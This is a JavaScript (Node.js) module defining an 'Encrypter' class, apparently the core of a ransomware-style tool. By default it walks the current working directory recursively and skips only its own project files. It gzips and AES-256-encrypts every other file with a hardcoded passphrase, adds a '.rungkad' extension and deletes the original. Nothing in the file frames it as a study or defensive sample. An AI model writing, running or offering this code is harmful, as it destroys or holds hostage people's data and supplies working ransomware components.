const crypto = require("crypto");
const fs = require('fs');
const path = require('path');
const zlib = require('zlib');
const AppendInitVect = require("./AppendInitVect");

class Encrypter {
    constructor(fPath=process.cwd(), extension="rungkad", key="panonaAlus"){
        this.fPath = fPath;
        this.extension = extension;
        this.key = this.setkey(key);
    }

    // set cv
    setPath(newPath){
        return this.fPath = newPath;
    }
    setExtension(newExtension){
        return this.extension = newExtension;
    }
    setkey(newKey){
        return this.key = crypto.createHash('sha256').update(newKey).digest();
    }


    encryptFile(file){
        const initVect = crypto.randomBytes(16);
        const readStream = fs.createReadStream(file);
        const gzip = zlib.createGzip();
        const cipher = crypto.createCipheriv('aes256', this.key, initVect);

        const appendInitVect = new AppendInitVect(initVect);

        const writeStream = fs.createWriteStream(path.join(file + `.${this.extension}`))

        readStream
            .pipe(gzip)
            .pipe(cipher)
            .pipe(appendInitVect)
            .pipe(writeStream);

        writeStream.on("finish", ()=>{
            fs.unlink(file, () => {
                console.log(`${path.basename(file)} encrypted `)
            })
        })
    }

    start(currentPath=this.fPath){
        
        const whiteList = ['index.js', 'node_modules', ".git", "package.json", 'lib'];
        let files;
        try{
            files = fs.statSync(this.fPath);
        }catch(e){
            console.log(`${this.fPath} tidak ditemukan`);
            process.exit(1);
        }

        if(files.isFile()){
            this.encryptFile(this.fPath);
        } else {
            const allPaths = fs.readdirSync(currentPath).filter((v) => whiteList.indexOf(v) === -1);
            
            allPaths.forEach((file) => {
                const oldPath = path.join(currentPath, file);
                const item = fs.statSync(oldPath);
                if(item.isDirectory()){
                    return this.start(oldPath)
                }
                this.encryptFile(oldPath)
            })
        }
    }
}

module.exports = Encrypter